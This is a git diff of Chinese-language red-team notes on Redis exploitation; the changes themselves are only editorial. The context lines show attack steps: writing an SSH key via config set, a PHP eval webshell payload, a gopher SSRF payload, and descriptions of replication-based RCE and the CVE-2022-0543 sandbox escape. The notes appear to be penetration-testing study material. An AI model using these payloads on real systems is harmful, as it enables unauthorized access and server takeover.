@@ -20,7 +20,7 @@
 
 ## 未授权访问漏洞
 
-**描述**
+**漏洞描述**
 
 Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的 ssh 公钥写入目标服务器的 `/root/.ssh` 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器、添加计划任务、写入 Webshell 等操作。
 
@@ -110,7 +110,7 @@ redis-cli -h <hostname>
 keys *
 get test
 
-# 设置 Redis 的备份路径为 /root/.ssh / 和保存文件名为 authorized_keys ，并将数据保存在目标服务器硬盘上
+# 设置 Redis 的备份路径为 /root/.ssh/ 和保存文件名为 authorized_keys ，并将数据保存在目标服务器硬盘上
 config set dir "/root/.ssh"
 config set dbfilename "authorized_keys"
 save
@@ -137,7 +137,7 @@ set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
 
 `\r\n\r\n` 代表换行，用 redis 写入文件的话会自带一些版本信息，如果不换行的话可能会导致无法执行, 可见下图
 
-![](../../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/Redis/1.png)
+![](../../../../../assets/img/Security/RedTeam/软件服务安全/实验/Redis/1.png)
 
 gopher payload
 ```
@@ -152,7 +152,7 @@ gopher://127.0.0.1:6379/_*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%
 
 ## 主从复制远程代码执行漏洞
 
-**描述**
+**漏洞描述**
 
 先创建一个恶意的 Redis 服务器作为 Redis 主机 (master)，该 Redis 主机能够回应其他连接他的 Redis 从机的响应。有了恶意的 Redis 主机之后，就会远程连接目标 Redis 服务器，通过 slaveof 命令将目标 Redis 服务器设置为我们恶意 Redis 的 Redis 从机(slaver)。然后将恶意 Redis 主机上的 exp 同步到 Reids 主机上，并将 dbfilename 设置为 exp.so。最后再控制 Redis 从机（slaver）加载模块执行系统命令即可
 
@@ -226,7 +226,7 @@ module unload system
 
 ## CVE-2022-0543 Redis沙盒逃逸
 
-**描述**
+**漏洞描述**
 
 在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module 和 require 以及 package 的 Lua 变量存在于上游 Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而 package 并没有清除，所以导致 redis 可以加载上游的 Lua 全局变量 package 来逃逸沙箱。
 
